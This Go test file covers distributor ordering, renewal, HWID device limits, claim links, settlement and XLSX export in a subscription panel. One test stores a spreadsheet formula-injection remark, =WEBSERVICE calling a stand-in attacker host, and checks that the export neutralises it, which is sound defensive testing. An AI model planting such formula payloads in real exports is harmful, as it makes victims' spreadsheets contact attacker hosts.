package httpapi

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/Hao-Monster/Xboard-Go/internal/store"
)

func TestDistributorLegacyPurchaseRenewDeliveryAndAllowlist(t *testing.T) {
	api, database := newTestAPI(t)
	ctx := context.Background()
	admin := loginAdmin(t, api)
	publicOrigin := "https://distributor-subscriptions.example.test"
	if _, err := database.UpdateLegacySiteSettings(t.Context(), 1, store.SaveLegacySiteSettingsInput{SubscribeURL: &publicOrigin}, fixedNow()); err != nil {
		t.Fatal(err)
	}
	createdUser := admin.request(t, api, http.MethodPost, "/api/v1/admin/users", `{
		"email":"dealer-api@example.test","password":"dealer-password-123","group_id":null,
		"transfer_enable":0,"expired_at":null,"speed_limit":0,"device_limit":0,"banned":false,
		"is_distributor":true,"distributor_name":"华东渠道"
	}`)
	if createdUser.Code != http.StatusCreated {
		t.Fatalf("create distributor status=%d body=%s", createdUser.Code, createdUser.Body)
	}
	var createdUserPayload struct {
		Data store.AdminUser `json:"data"`
	}
	decodeResponse(t, createdUser, &createdUserPayload)
	group, err := database.CreateServerGroup(ctx, "Distributor API group", fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	devices := 3
	plan, err := database.CreatePlan(ctx, store.SavePlanInput{
		Name: "分销 API 套餐", GroupID: &group.ID, TransferEnableGiB: 100, DeviceLimit: &devices,
		Prices: store.PlanPrices{"monthly": 100_000, "quarterly": 270_000},
	}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	plan, err = database.SetPlanState(ctx, plan.ID, plan.Revision, store.PlanState{Show: true, Sell: true, Renew: true}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	dealer := loginLegacyBearer(t, api, "dealer-api@example.test", "dealer-password-123")
	created := bearerRequest(api, http.MethodPost, "/api/v1/user/order/save", dealer.Authorization,
		fmt.Sprintf(`{"plan_id":%d,"period":"month_price"}`, plan.ID))
	if created.Code != http.StatusOK {
		t.Fatalf("distributor purchase status=%d body=%s", created.Code, created.Body)
	}
	var createdPayload struct {
		Data string `json:"data"`
	}
	decodeResponse(t, created, &createdPayload)
	tradeNo := createdPayload.Data
	if len(tradeNo) != 25 {
		t.Fatalf("trade number = %q", tradeNo)
	}

	listed := bearerRequest(api, http.MethodGet, "/api/v1/user/order/fetch", dealer.Authorization, "")
	if listed.Code != http.StatusOK || !containsAll(listed.Body.String(), `"is_distributor_order":true`, `"customer_name":null`,
		`"settlement_status":0`, `"can_view_subscription_qr":true`, `"can_renew":true`) {
		t.Fatalf("distributor list status=%d body=%s", listed.Code, listed.Body)
	}
	qrResponse := bearerRequest(api, http.MethodGet, "/api/v1/user/distributor/subscription-qr?trade_no="+tradeNo, dealer.Authorization, "")
	if qrResponse.Code != http.StatusOK || !strings.Contains(qrResponse.Body.String(), `"qr_code":"data:image/svg+xml;base64,`) ||
		strings.Contains(qrResponse.Body.String(), `"subscribe_url"`) {
		t.Fatalf("subscription QR status=%d body=%s", qrResponse.Code, qrResponse.Body)
	}
	delivery := bearerRequest(api, http.MethodGet, "/api/v1/user/distributor/delivery?trade_no="+tradeNo, dealer.Authorization, "")
	if delivery.Code != http.StatusOK || !strings.Contains(delivery.Body.String(), `"can_open":true`) {
		t.Fatalf("delivery status=%d body=%s", delivery.Code, delivery.Body)
	}
	const legacyRenewalKey = "9f6bcf91-e170-4a8c-90e7-67eb1305937a" // gitleaks:allow -- deterministic UUID fixture
	renewed := bearerRequest(api, http.MethodPost, "/api/v1/user/order/renew", dealer.Authorization, fmt.Sprintf(`{
		"trade_no":"%s","period":"quarter_price","idempotency_key":%q
	}`, tradeNo, legacyRenewalKey))
	if renewed.Code != http.StatusOK || !containsAll(renewed.Body.String(), `"subscription_trade_no":"`+tradeNo+`"`, `"period":"quarter_price"`, `"total_amount":270000`) {
		t.Fatalf("renew status=%d body=%s", renewed.Code, renewed.Body)
	}
	methods := bearerRequest(api, http.MethodGet, "/api/v1/user/order/getPaymentMethod", dealer.Authorization, "")
	if methods.Code != http.StatusOK || !strings.Contains(methods.Body.String(), `"data":[]`) {
		t.Fatalf("distributor payment methods status=%d body=%s", methods.Code, methods.Body)
	}
	checkout := bearerRequest(api, http.MethodPost, "/api/v1/user/order/checkout", dealer.Authorization, `{"trade_no":"`+tradeNo+`"}`)
	if checkout.Code != http.StatusOK || !containsAll(checkout.Body.String(), `"type":-1`, `"data":true`) {
		t.Fatalf("distributor checkout status=%d body=%s", checkout.Code, checkout.Body)
	}
	forbidden := bearerRequest(api, http.MethodGet, "/api/v1/user/getSubscribe", dealer.Authorization, "")
	if forbidden.Code != http.StatusForbidden {
		t.Fatalf("distributor normal subscription status=%d body=%s", forbidden.Code, forbidden.Body)
	}
	normalOrder, err := database.CreateOrder(ctx, store.CreateOrderInput{UserID: createdUserPayload.Data.ID, PlanID: plan.ID, Period: "monthly"}, fixedNow().Add(time.Minute))
	if err != nil {
		t.Fatal(err)
	}
	for _, request := range []struct {
		method string
		path   string
		body   string
	}{
		{http.MethodGet, "/api/v1/user/order/check?trade_no=" + normalOrder.TradeNo, ""},
		{http.MethodPost, "/api/v1/user/order/checkout", `{"trade_no":"` + normalOrder.TradeNo + `"}`},
		{http.MethodPost, "/api/v1/user/order/cancel", `{"trade_no":"` + normalOrder.TradeNo + `"}`},
	} {
		response := bearerRequest(api, request.method, request.path, dealer.Authorization, request.body)
		if response.Code != http.StatusForbidden || !strings.Contains(response.Body.String(), "不能访问普通订单") {
			t.Fatalf("distributor legacy normal order %s %s status=%d body=%s", request.method, request.path, response.Code, response.Body)
		}
	}
	closeCandidate := bearerRequest(api, http.MethodPost, "/api/v1/user/order/save", dealer.Authorization,
		fmt.Sprintf(`{"plan_id":%d,"period":"month_price"}`, plan.ID))
	if closeCandidate.Code != http.StatusOK {
		t.Fatalf("create close candidate status=%d body=%s", closeCandidate.Code, closeCandidate.Body)
	}
	var closeCandidatePayload struct {
		Data string `json:"data"`
	}
	decodeResponse(t, closeCandidate, &closeCandidatePayload)
	closed := bearerRequest(api, http.MethodPost, "/api/v1/user/distributor/delivery/close", dealer.Authorization,
		fmt.Sprintf(`{"trade_no":%q,"confirm":true}`, closeCandidatePayload.Data))
	if closed.Code != http.StatusOK || !containsAll(closed.Body.String(), `"delivery_status":2`, `"can_open":false`) ||
		strings.Contains(closed.Body.String(), `"qr_code"`) {
		t.Fatalf("close delivery status=%d body=%s", closed.Code, closed.Body)
	}
}

func TestDistributorDirectSubscriptionHWIDAndClaimCompatibility(t *testing.T) {
	api, database := newTestAPI(t)
	ctx := context.Background()
	plan, distributor := createHTTPDistributorFixture(t, database)
	created, err := database.CreateDistributorOrder(ctx, store.CreateDistributorOrderInput{
		DistributorUserID: distributor.ID, PlanID: plan.ID, Period: "monthly",
	}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	path := "/s/" + created.Subscription.SubscriptionToken
	missing := httptestRequest(api, http.MethodGet, path, map[string]string{"User-Agent": "clash"})
	if missing.Code != http.StatusNotFound || missing.Header().Get("x-hwid-not-supported") != "true" || missing.Header().Get("x-hwid-active") != "true" {
		t.Fatalf("missing HWID status=%d headers=%v body=%s", missing.Code, missing.Header(), missing.Body)
	}
	valid := httptestRequest(api, http.MethodGet, path, map[string]string{
		"User-Agent": "clash", "x-hwid": "ABCDEFGHIJ123456", "x-device-model": "Desktop",
	})
	if valid.Code != http.StatusOK || valid.Header().Get("x-order-no") != created.Order.TradeNo ||
		!strings.HasPrefix(valid.Header().Get("profile-title"), "base64:") {
		t.Fatalf("valid HWID status=%d headers=%v body=%s", valid.Code, valid.Header(), valid.Body)
	}
	encodedTitle := strings.TrimPrefix(valid.Header().Get("profile-title"), "base64:")
	if decoded, err := base64.StdEncoding.DecodeString(encodedTitle); err != nil || string(decoded) != "订单号："+created.Order.TradeNo {
		t.Fatalf("profile title = %q err=%v", decoded, err)
	}
	second := httptestRequest(api, http.MethodGet, path, map[string]string{"User-Agent": "clash", "x-hwid": "ZYXWVUTSRQ654321"})
	if second.Code != http.StatusNotFound || second.Header().Get("x-hwid-max-devices-reached") != "true" || second.Header().Get("x-hwid-limit") != "true" {
		t.Fatalf("second HWID status=%d headers=%v body=%s", second.Code, second.Header(), second.Body)
	}
	claimOrder, err := database.CreateDistributorOrder(ctx, store.CreateDistributorOrderInput{
		DistributorUserID: distributor.ID, PlanID: plan.ID, Period: "monthly",
	}, fixedNow().Add(-time.Second))
	if err != nil {
		t.Fatal(err)
	}
	claimPath := "/api/v1/client/distributor/claim/" + claimOrder.Subscription.ClaimToken
	head := httptestRequest(api, http.MethodHead, claimPath, nil)
	if head.Code != http.StatusMethodNotAllowed || head.Header().Get("Allow") != http.MethodGet {
		t.Fatalf("claim HEAD status=%d headers=%v", head.Code, head.Header())
	}
	prefetch := httptestRequest(api, http.MethodGet, claimPath, map[string]string{"Sec-Purpose": "prefetch"})
	if prefetch.Code != http.StatusTooEarly {
		t.Fatalf("claim prefetch status=%d", prefetch.Code)
	}
	claimed := httptestRequest(api, http.MethodGet, claimPath+"?flag=clash", nil)
	claimSubscriptionPath := "/s/" + claimOrder.Subscription.SubscriptionToken
	if claimed.Code != http.StatusFound || !strings.Contains(claimed.Header().Get("Location"), claimSubscriptionPath+"?flag=clash#"+claimOrder.Order.TradeNo) {
		t.Fatalf("claim status=%d location=%q body=%s", claimed.Code, claimed.Header().Get("Location"), claimed.Body)
	}
	repeated := httptestRequest(api, http.MethodGet, claimPath, nil)
	if repeated.Code != http.StatusGone {
		t.Fatalf("repeated claim status=%d body=%s", repeated.Code, repeated.Body)
	}
}

func TestAdministratorDistributorOrderManagementAndSettlement(t *testing.T) {
	api, database := newTestAPI(t)
	plan, distributor := createHTTPDistributorFixture(t, database)
	created, err := database.CreateDistributorOrder(context.Background(), store.CreateDistributorOrderInput{
		DistributorUserID: distributor.ID, PlanID: plan.ID, Period: "monthly",
	}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	admin := loginAdmin(t, api)
	publicOrigin := "https://distributor-subscriptions.example.test"
	if _, err := database.UpdateLegacySiteSettings(t.Context(), 1, store.SaveLegacySiteSettingsInput{SubscribeURL: &publicOrigin}, fixedNow()); err != nil {
		t.Fatal(err)
	}

	options := admin.request(t, api, http.MethodGet, "/api/v1/admin/distributors/options", "")
	if options.Code != http.StatusOK || !containsAll(options.Body.String(), `"id":`, `"email":"direct-dealer@example.test"`, `"distributor_name":"直连渠道"`) {
		t.Fatalf("distributor options status=%d body=%s", options.Code, options.Body)
	}
	listed := admin.request(t, api, http.MethodGet, fmt.Sprintf(
		"/api/v1/admin/distributor-orders?distributor_user_id=%d&settlement_status=0&search=%s",
		distributor.ID, created.Order.TradeNo), "")
	if listed.Code != http.StatusOK || !containsAll(listed.Body.String(), created.Order.TradeNo,
		`"is_subscription_origin":true`, `"settlement_status":0`, `"subscription_entitlement"`) ||
		strings.Contains(listed.Body.String(), created.Subscription.SubscriptionToken) || strings.Contains(listed.Body.String(), created.Subscription.SubscriberUUID) {
		t.Fatalf("distributor list status=%d body=%s", listed.Code, listed.Body)
	}
	detailPath := fmt.Sprintf("/api/v1/admin/distributor-orders/%d", created.Order.ID)
	detail := admin.request(t, api, http.MethodGet, detailPath, "")
	if detail.Code != http.StatusOK || !containsAll(detail.Body.String(), created.Order.TradeNo, `"registered_count":0`,
		`"subscribe_url":"https://distributor-subscriptions.example.test/s/`) || strings.Contains(detail.Body.String(), `internal.invalid`) ||
		strings.Contains(detail.Body.String(), `"subscription_token"`) {
		t.Fatalf("distributor detail status=%d body=%s", detail.Code, detail.Body)
	}

	remark := admin.request(t, api, http.MethodPatch, detailPath+"/remark", `{"remark":"  =FORMULA  "}`)
	if remark.Code != http.StatusOK || !strings.Contains(remark.Body.String(), `"remark":"=FORMULA"`) {
		t.Fatalf("update remark status=%d body=%s", remark.Code, remark.Body)
	}
	entitlement := admin.request(t, api, http.MethodPatch, detailPath+"/entitlement",
		`{"transfer_enable":214748364800,"expired_at":"2027-01-31T12:00:00Z","speed_limit":300,"device_limit":5}`)
	if entitlement.Code != http.StatusOK || !containsAll(entitlement.Body.String(), `"transfer_enable":214748364800`, `"speed_limit":300`, `"device_limit":5`) {
		t.Fatalf("update entitlement status=%d body=%s", entitlement.Code, entitlement.Body)
	}
	hwid := admin.request(t, api, http.MethodPatch, detailPath+"/hwid", `{"enabled":true,"limit":2}`)
	if hwid.Code != http.StatusOK || !containsAll(hwid.Body.String(), `"enabled":true`, `"limit":2`) {
		t.Fatalf("update HWID status=%d body=%s", hwid.Code, hwid.Body)
	}
	authorized, err := database.AuthorizeDistributorHWID(context.Background(), store.AuthorizeDistributorHWIDInput{
		SubscriberUserID: created.Subscription.SubscriberUserID, HWID: "ADMINDEVICE123", DeviceModel: "Desktop",
	}, fixedNow())
	if err != nil || !authorized.Allowed {
		t.Fatalf("authorize HWID=%#v err=%v", authorized, err)
	}
	devices := admin.request(t, api, http.MethodGet, detailPath+"/hwid/devices?search=ADMIN", "")
	if devices.Code != http.StatusOK || !containsAll(devices.Body.String(), `"hwid":"ADMINDEVICE123"`, `"device_model":"Desktop"`) {
		t.Fatalf("list HWID status=%d body=%s", devices.Code, devices.Body)
	}
	var devicesPayload struct {
		Data []store.DistributorHWIDDevice `json:"data"`
	}
	decodeResponse(t, devices, &devicesPayload)
	if len(devicesPayload.Data) != 1 {
		t.Fatalf("HWID devices=%#v", devicesPayload.Data)
	}
	deleted := admin.request(t, api, http.MethodDelete,
		fmt.Sprintf("%s/hwid/devices/%d", detailPath, devicesPayload.Data[0].ID), "")
	if deleted.Code != http.StatusOK || !strings.Contains(deleted.Body.String(), `"data":true`) {
		t.Fatalf("delete HWID status=%d body=%s", deleted.Code, deleted.Body)
	}

	settlementPath := fmt.Sprintf("/api/v1/admin/distributors/%d/settlement", distributor.ID)
	preview := admin.request(t, api, http.MethodGet, settlementPath, "")
	if preview.Code != http.StatusOK || !containsAll(preview.Body.String(), `"count":1`, `"total_amount":1000`) {
		t.Fatalf("settlement preview status=%d body=%s", preview.Code, preview.Body)
	}
	settled := admin.request(t, api, http.MethodPost, settlementPath, `{}`)
	if settled.Code != http.StatusOK || !containsAll(settled.Body.String(), `"count":1`, `"total_amount":1000`, `"settled_at":`) {
		t.Fatalf("settlement status=%d body=%s", settled.Code, settled.Body)
	}
	repeated := admin.request(t, api, http.MethodPost, settlementPath, `{}`)
	if repeated.Code != http.StatusOK || !containsAll(repeated.Body.String(), `"count":0`, `"total_amount":0`, `"settled_at":null`) {
		t.Fatalf("repeated settlement status=%d body=%s", repeated.Code, repeated.Body)
	}
}

func TestLegacyAdministratorDistributorManagementRoutes(t *testing.T) {
	api, database := newTestAPI(t)
	plan, distributor := createHTTPDistributorFixture(t, database)
	created, err := database.CreateDistributorOrder(context.Background(), store.CreateDistributorOrderInput{
		DistributorUserID: distributor.ID, PlanID: plan.ID, Period: "monthly",
	}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	authorization := loginLegacyBearer(t, api, "admin@example.test", "admin-password-123").Authorization
	const orderPrefix = "/api/v2/admin/order"

	options := bearerRequest(api, http.MethodGet, "/api/v2/admin/user/distributor/options", authorization, "")
	if options.Code != http.StatusOK || !containsAll(options.Body.String(), `"email":"direct-dealer@example.test"`, `"distributor_name":"直连渠道"`) {
		t.Fatalf("legacy distributor options status=%d body=%s", options.Code, options.Body)
	}
	fetched := bearerRequest(api, http.MethodPost, orderPrefix+"/fetch", authorization,
		fmt.Sprintf(`{"current":1,"pageSize":10,"distributor_only":true,"distributor_user_id":%d,"settlement_status":0,"search":%q}`,
			distributor.ID, created.Order.TradeNo))
	if fetched.Code != http.StatusOK || !containsAll(fetched.Body.String(), created.Order.TradeNo,
		`"is_distributor_order":true`, `"distributor_name":"直连渠道"`, `"subscription_entitlement"`) {
		t.Fatalf("legacy distributor fetch status=%d body=%s", fetched.Code, fetched.Body)
	}
	detail := bearerRequest(api, http.MethodPost, orderPrefix+"/detail", authorization, fmt.Sprintf(`{"id":%d}`, created.Order.ID))
	if detail.Code != http.StatusOK || !containsAll(detail.Body.String(), created.Order.TradeNo,
		`"subscribe_url":"https://panel.example.test/s/`, `"subscription_entitlement"`, `"hwid":{"enabled":true`) ||
		strings.Contains(detail.Body.String(), `internal.invalid`) || strings.Contains(detail.Body.String(), `"subscription_token"`) {
		t.Fatalf("legacy distributor detail status=%d body=%s", detail.Code, detail.Body)
	}
	preview := bearerRequest(api, http.MethodGet, fmt.Sprintf("%s/settlement/preview?distributor_user_id=%d", orderPrefix, distributor.ID), authorization, "")
	if preview.Code != http.StatusOK || !containsAll(preview.Body.String(), `"count":1`, `"total_amount":1000`, `"total_amount_yuan":10`) {
		t.Fatalf("legacy preview status=%d body=%s", preview.Code, preview.Body)
	}
	remark := bearerRequest(api, http.MethodPost, orderPrefix+"/remark/update", authorization,
		fmt.Sprintf(`{"order_id":%d,"remark":"  渠道备注  "}`, created.Order.ID))
	if remark.Code != http.StatusOK || !containsAll(remark.Body.String(), `"remark":"渠道备注"`, `"subscription_trade_no":"`+created.Order.TradeNo+`"`) {
		t.Fatalf("legacy remark status=%d body=%s", remark.Code, remark.Body)
	}
	entitlement := bearerRequest(api, http.MethodPost, orderPrefix+"/entitlement/update", authorization,
		fmt.Sprintf(`{"order_id":%d,"transfer_enable":322122547200,"expired_at":1800000000,"speed_limit":500,"device_limit":8}`, created.Order.ID))
	if entitlement.Code != http.StatusOK || !containsAll(entitlement.Body.String(), `"transfer_enable":322122547200`, `"expired_at":1800000000`, `"speed_limit":500`) {
		t.Fatalf("legacy entitlement status=%d body=%s", entitlement.Code, entitlement.Body)
	}
	hwid := bearerRequest(api, http.MethodPost, orderPrefix+"/hwid/update", authorization,
		fmt.Sprintf(`{"order_id":%d,"enabled":true,"limit":3}`, created.Order.ID))
	if hwid.Code != http.StatusOK || !containsAll(hwid.Body.String(), `"enabled":true`, `"limit":3`) {
		t.Fatalf("legacy HWID status=%d body=%s", hwid.Code, hwid.Body)
	}
	authorized, err := database.AuthorizeDistributorHWID(context.Background(), store.AuthorizeDistributorHWIDInput{
		SubscriberUserID: created.Subscription.SubscriberUserID, HWID: "LEGACYDEVICE123", DeviceModel: "Legacy desktop",
	}, fixedNow())
	if err != nil || !authorized.Allowed {
		t.Fatalf("authorize legacy HWID=%#v err=%v", authorized, err)
	}
	devices := bearerRequest(api, http.MethodGet,
		fmt.Sprintf("%s/hwid/devices?order_id=%d&search=LEGACY", orderPrefix, created.Order.ID), authorization, "")
	if devices.Code != http.StatusOK || !containsAll(devices.Body.String(), `"hwid":"LEGACYDEVICE123"`, `"device_model":"Legacy desktop"`) {
		t.Fatalf("legacy HWID devices status=%d body=%s", devices.Code, devices.Body)
	}
	var devicesPayload struct {
		Data []store.DistributorHWIDDevice `json:"data"`
	}
	decodeResponse(t, devices, &devicesPayload)
	if len(devicesPayload.Data) != 1 {
		t.Fatalf("legacy HWID devices=%#v", devicesPayload.Data)
	}
	deleted := bearerRequest(api, http.MethodPost, orderPrefix+"/hwid/device/delete", authorization,
		fmt.Sprintf(`{"order_id":%d,"device_id":%d}`, created.Order.ID, devicesPayload.Data[0].ID))
	if deleted.Code != http.StatusOK || !strings.Contains(deleted.Body.String(), `"data":true`) {
		t.Fatalf("delete legacy HWID status=%d body=%s", deleted.Code, deleted.Body)
	}
	settled := bearerRequest(api, http.MethodPost, orderPrefix+"/settlement/settle", authorization,
		fmt.Sprintf(`{"distributor_user_id":%d}`, distributor.ID))
	if settled.Code != http.StatusOK || !containsAll(settled.Body.String(), `"count":1`, `"total_amount":1000`, `"total_amount_yuan":10`) {
		t.Fatalf("legacy settle status=%d body=%s", settled.Code, settled.Body)
	}
}

func TestModernDistributorPortalOrderLifecycle(t *testing.T) {
	api, database := newTestAPI(t)
	plan := createOrderAPIPlan(t, database, store.PlanPrices{"monthly": 5_000, "quarterly": 14_000})
	admin := loginAdmin(t, api)
	createdUser := admin.request(t, api, http.MethodPost, "/api/v1/admin/users", `{
		"email":"portal-dealer@example.test","password":"portal-dealer-password-123","group_id":null,
		"transfer_enable":0,"expired_at":null,"speed_limit":0,"device_limit":0,"banned":false,
		"is_distributor":true,"distributor_name":"门户渠道"
	}`)
	if createdUser.Code != http.StatusCreated {
		t.Fatalf("create portal distributor status=%d body=%s", createdUser.Code, createdUser.Body)
	}
	dealer := loginAs(t, api, "portal-dealer@example.test", "portal-dealer-password-123")
	forbiddenOrder := dealer.request(t, api, http.MethodPost, "/api/v1/orders",
		fmt.Sprintf(`{"plan_id":%d,"period":"monthly"}`, plan.ID))
	if forbiddenOrder.Code != http.StatusForbidden || !strings.Contains(forbiddenOrder.Body.String(), `"distributor_route_forbidden"`) {
		t.Fatalf("normal order route status=%d body=%s", forbiddenOrder.Code, forbiddenOrder.Body)
	}
	forbiddenTickets := dealer.request(t, api, http.MethodGet, "/api/v1/tickets", "")
	if forbiddenTickets.Code != http.StatusForbidden {
		t.Fatalf("normal ticket route status=%d body=%s", forbiddenTickets.Code, forbiddenTickets.Body)
	}
	empty := dealer.request(t, api, http.MethodGet, "/api/v1/distributor/orders", "")
	if empty.Code != http.StatusOK || !containsAll(empty.Body.String(), `"items":[]`, `"total":0`) {
		t.Fatalf("empty portal orders status=%d body=%s", empty.Code, empty.Body)
	}
	created := dealer.request(t, api, http.MethodPost, "/api/v1/distributor/orders",
		fmt.Sprintf(`{"plan_id":%d,"period":"monthly"}`, plan.ID))
	if created.Code != http.StatusCreated || !containsAll(created.Body.String(), `"is_subscription_origin":true`, `"settlement_status":0`) {
		t.Fatalf("create portal order status=%d body=%s", created.Code, created.Body)
	}
	var createdPayload struct {
		Data store.DistributorOrder `json:"data"`
	}
	decodeResponse(t, created, &createdPayload)
	order := createdPayload.Data
	if strings.Contains(created.Body.String(), `"subscription_token"`) || strings.Contains(created.Body.String(), `"subscriber_uuid"`) ||
		strings.Contains(created.Body.String(), `"subscribe_url"`) {
		t.Fatalf("portal create exposed secret: %s", created.Body)
	}
	detailPath := "/api/v1/distributor/orders/" + order.Order.TradeNo
	detail := dealer.request(t, api, http.MethodGet, detailPath, "")
	if detail.Code != http.StatusOK || !strings.Contains(detail.Body.String(), order.Order.TradeNo) {
		t.Fatalf("portal detail status=%d body=%s", detail.Code, detail.Body)
	}
	qr := dealer.request(t, api, http.MethodGet, detailPath+"/qr", "")
	if qr.Code != http.StatusOK || !strings.Contains(qr.Body.String(), `"qr_code":"data:image/svg+xml`) || strings.Contains(qr.Body.String(), `"subscribe_url"`) {
		t.Fatalf("portal QR status=%d body=%s", qr.Code, qr.Body)
	}
	const renewalKey = "c90c31c9-18e9-4e4c-a75d-838c71a5327e" // gitleaks:allow -- deterministic UUID fixture
	renewed := dealer.request(t, api, http.MethodPost, detailPath+"/renew",
		fmt.Sprintf(`{"period":"quarterly","idempotency_key":%q}`, renewalKey))
	if renewed.Code != http.StatusOK || !containsAll(renewed.Body.String(), `"period":"quarterly"`, `"settlement_status":0`) {
		t.Fatalf("portal renew status=%d body=%s", renewed.Code, renewed.Body)
	}
	replayed := dealer.request(t, api, http.MethodPost, detailPath+"/renew",
		fmt.Sprintf(`{"period":"quarterly","idempotency_key":%q}`, renewalKey))
	var first, second struct {
		Data store.DistributorOrder `json:"data"`
	}
	decodeResponse(t, renewed, &first)
	decodeResponse(t, replayed, &second)
	if replayed.Code != http.StatusOK || first.Data.Order.ID != second.Data.Order.ID {
		t.Fatalf("portal renew replay first=%s second status=%d body=%s", renewed.Body, replayed.Code, replayed.Body)
	}
	listed := dealer.request(t, api, http.MethodGet, "/api/v1/distributor/orders?page=1&page_size=10&settlement_status=0", "")
	if listed.Code != http.StatusOK || !containsAll(listed.Body.String(), `"total":2`, `"is_subscription_origin":true`, `"is_subscription_origin":false`, `"bound_devices":[]`) {
		t.Fatalf("portal orders status=%d body=%s", listed.Code, listed.Body)
	}
	remark := admin.request(t, api, http.MethodPatch,
		fmt.Sprintf("/api/v1/admin/distributor-orders/%d/remark", order.Order.ID), `{"remark":"=WEBSERVICE(\"https://attacker.invalid\")"}`)
	if remark.Code != http.StatusOK {
		t.Fatalf("set export formula remark status=%d body=%s", remark.Code, remark.Body)
	}
	exported := dealer.request(t, api, http.MethodGet, "/api/v1/distributor/orders/export", "")
	assertDistributorXLSX(t, exported, "G2", "50.00", "&#39;=WEBSERVICE")
	adminExport := admin.request(t, api, http.MethodGet,
		fmt.Sprintf("/api/v1/admin/distributor-orders/export?distributor_user_id=%d", order.Subscription.DistributorUserID), "")
	assertDistributorXLSX(t, adminExport, "H2", "50.00", "门户渠道")
}

func assertDistributorXLSX(t *testing.T, response *httptest.ResponseRecorder, amountCell, amount string, expectedText string) {
	t.Helper()
	if response.Code != http.StatusOK || response.Header().Get("Content-Type") != distributorXLSXContentType ||
		!strings.Contains(response.Header().Get("Content-Disposition"), ".xlsx") {
		t.Fatalf("XLSX response status=%d headers=%v body=%q", response.Code, response.Header(), response.Body.String())
	}
	reader, err := zip.NewReader(bytes.NewReader(response.Body.Bytes()), int64(response.Body.Len()))
	if err != nil {
		t.Fatalf("open XLSX: %v", err)
	}
	var sheet string
	for _, file := range reader.File {
		if file.Name != "xl/worksheets/sheet1.xml" {
			continue
		}
		opened, err := file.Open()
		if err != nil {
			t.Fatal(err)
		}
		content, readErr := io.ReadAll(opened)
		closeErr := opened.Close()
		if readErr != nil || closeErr != nil {
			t.Fatalf("read XLSX sheet read=%v close=%v", readErr, closeErr)
		}
		sheet = string(content)
	}
	if !containsAll(sheet, `state="frozen"`, `<autoFilter ref="A1:`, `r="`+amountCell+`" s="2"><v>`+amount+`</v>`, expectedText) ||
		strings.Contains(sheet, `<f>`) {
		t.Fatalf("unexpected XLSX worksheet: %s", sheet)
	}
}

func createHTTPDistributorFixture(t *testing.T, database *store.Store) (store.Plan, store.AdminUser) {
	t.Helper()
	ctx := context.Background()
	group, err := database.CreateServerGroup(ctx, "HTTP distributor group", fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	plan, err := database.CreatePlan(ctx, store.SavePlanInput{Name: "HTTP distributor plan", GroupID: &group.ID, TransferEnableGiB: 10, Prices: store.PlanPrices{"monthly": 1000}}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	plan, err = database.SetPlanState(ctx, plan.ID, plan.Revision, store.PlanState{Show: true, Sell: true, Renew: true}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	distributor, err := database.CreateAdminUser(ctx, store.CreateAdminUserInput{Email: "direct-dealer@example.test", PasswordHash: "hash", IsDistributor: true, DistributorName: "直连渠道"}, fixedNow())
	if err != nil {
		t.Fatal(err)
	}
	return plan, distributor
}

func httptestRequest(api http.Handler, method, path string, headers map[string]string) *httptest.ResponseRecorder {
	request := newTestRequest(method, path, nil)
	for name, value := range headers {
		request.Header.Set(name, value)
	}
	response := httptest.NewRecorder()
	api.ServeHTTP(response, request)
	return response
}
